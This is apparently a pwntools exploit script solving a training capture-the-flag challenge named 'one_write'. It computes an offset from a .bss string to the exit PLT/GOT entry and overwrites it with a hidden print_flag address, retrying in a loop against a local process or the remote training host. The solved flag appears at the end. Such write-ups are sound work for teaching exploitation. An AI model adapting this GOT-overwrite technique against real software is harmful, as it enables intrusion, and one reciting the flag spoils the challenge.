from pwn import *

# asks for what to read (byte(1)/short(2)/int(3)), then gets an offset (from string magic) to write to and then gets data to write

EXE = "./one_write"
CHALL = ELF(EXE, checksec = False)
COMMANDS = """
brva 0x178E
c
"""
context.arch = "amd64"
cont = True

# SIP = 0x00007fffffffdc38
# MAGIC = 0x00005555555580d8
# PRINT_FLAG = 0x0000555555555329
# offset = SIP - MAGIC

MAGIC_REL_ADDR = 0x40D8         # magic string in .bss section (static data)
PRINT_FLAG_REL_ADDR = 0x1329
EXIT_PLT_REL_ADDR = 0x4078
EXIT_REL_ADDR = 0x4168
offset = EXIT_PLT_REL_ADDR - MAGIC_REL_ADDR

# brute forcing the address of hidden funct print_flag
while cont :
    if args.REMOTE:
        c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
    else:
        if args.GDB:
            c = gdb.debug(EXE, gdbscript = COMMANDS)
        else:
            c = process(EXE)

    c.recvuntil(b"Choice: ")
    c.sendline(b"2")                                    # we want the program to write 2 bytes (short int)
    c.recvuntil(b"Offset: ")
    c.sendline(bytes(str(offset), "utf-8"))             # exit directly jumps to the address written at EXIT_PLT _ADDR
    c.recvuntil(b"Value: ")
    c.send(bytes(str(PRINT_FLAG_REL_ADDR), "utf-8"))    # overwriting exit jump address with the one of print_flag
    c.recvuntil(b"Thanks! I'll write that for you.\n")

    cont = False

    try :
        message = c.recvline()
        print(message)
    except EOFError :
        cont = True  

    c.close()

# flag{L4zy_L04d1nG_C4N_b3_pr0bl3matiC!!!}
# 0x55cd92c9d655 - 0xc - 0x1649 + 0x1329 = 0x55CD92C9D329